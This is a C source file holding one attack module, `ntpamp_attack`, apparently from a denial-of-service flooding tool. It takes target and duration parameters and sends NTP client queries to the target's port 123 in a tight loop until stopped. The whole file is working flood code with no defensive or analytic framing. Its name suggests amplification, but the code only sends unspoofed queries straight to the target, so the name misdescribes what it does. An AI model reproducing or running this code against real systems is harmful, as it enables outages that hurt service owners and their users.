#define _GNU_SOURCE

#include "headers/ntpamp_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

void* ntpamp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int ntp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (ntp_sock < 0) {
        return NULL;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(123);
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    unsigned char ntp_query[48];
    memset(ntp_query, 0, sizeof(ntp_query));
    
    ntp_query[0] = 0x1b;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        ssize_t sent = sendto(ntp_sock, ntp_query, sizeof(ntp_query), MSG_NOSIGNAL,
                            (struct sockaddr*)&dest, sizeof(dest));
        if (sent < 0) break;
    }

    close(ntp_sock);
    return NULL;
}
